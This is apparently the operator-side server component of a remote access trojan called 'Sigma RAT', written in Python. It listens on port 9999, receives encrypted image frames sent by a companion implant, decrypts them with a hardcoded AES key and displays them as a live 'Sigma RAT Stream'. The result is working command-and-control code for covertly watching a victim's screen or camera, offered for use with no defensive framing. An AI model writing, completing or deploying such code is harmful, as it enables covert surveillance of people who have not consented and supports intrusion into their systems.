import socket
import cv2
import numpy as np
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import logging

# Must match sigmarat.py
AES_KEY = b"16bytekey1234567"
AES_IV = b"16byteiv12345678"

# Logging setup
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s",
                    handlers=[logging.FileHandler("stream_server.log"), logging.StreamHandler()])

def decrypt_data(encrypted_data):
    """Decrypt AES-encrypted data from sigmarat.py."""
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        decrypted = unpad(cipher.decrypt(base64.b64decode(encrypted_data)), 16).decode()
        logging.debug("Decryption successful")
        return decrypted
    except Exception as e:
        logging.error(f"Decryption error: {str(e)}")
        return None

def start_server(host="0.0.0.0", port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow port reuse
    try:
        server_socket.bind((host, port))
        server_socket.listen(1)
        logging.info(f"[*] Server listening on {host}:{port}")
    except Exception as e:
        logging.error(f"Failed to bind server: {str(e)}")
        return

    while True:
        try:
            conn, addr = server_socket.accept()
            logging.info(f"[+] Connection from {addr}")
            
            while True:
                try:
                    # Receive frame size (16 bytes, padded)
                    size_data = conn.recv(16).decode('utf-8', errors='ignore').strip()
                    if not size_data:
                        logging.warning("No size data received, client disconnected")
                        break
                    logging.debug(f"Received size_data: '{size_data}'")
                    
                    try:
                        frame_size = int(size_data)
                        logging.debug(f"Parsed frame size: {frame_size}")
                    except ValueError:
                        logging.error(f"Invalid frame size: '{size_data}'")
                        break

                    # Receive frame data
                    frame_data = b""
                    bytes_received = 0
                    while bytes_received < frame_size:
                        chunk = conn.recv(min(frame_size - bytes_received, 4096))
                        if not chunk:
                            logging.warning("Incomplete frame data, client disconnected")
                            break
                        frame_data += chunk
                        bytes_received += len(chunk)
                    logging.debug(f"Received {bytes_received} bytes of frame data")

                    if len(frame_data) != frame_size:
                        logging.error(f"Frame data incomplete: expected {frame_size}, got {len(frame_data)}")
                        break

                    # Decrypt and decode frame
                    frame_data_str = decrypt_data(frame_data.decode('utf-8', errors='ignore'))
                    if frame_data_str is None:
                        logging.error("Skipping frame due to decryption failure")
                        continue

                    frame_buffer = base64.b64decode(frame_data_str)
                    frame_array = np.frombuffer(frame_buffer, dtype=np.uint8)
                    frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)

                    if frame is None:
                        logging.warning("Failed to decode frame into image")
                        continue

                    logging.debug(f"Frame decoded: {frame.shape}")
                    cv2.imshow("Sigma RAT Stream", frame)
                    if cv2.waitKey(1) & 0xFF == ord("q"):
                        logging.info("User quit with 'q'")
                        break

                except Exception as e:
                    logging.error(f"Stream processing error: {str(e)}")
                    break

            conn.close()
            logging.info("[*] Client disconnected. Waiting for new connection...")
        except Exception as e:
            logging.error(f"Server accept error: {str(e)}")
    
    server_socket.close()
    cv2.destroyAllWindows()
    logging.info("Server shut down")

if __name__ == "__main__":
    start_server()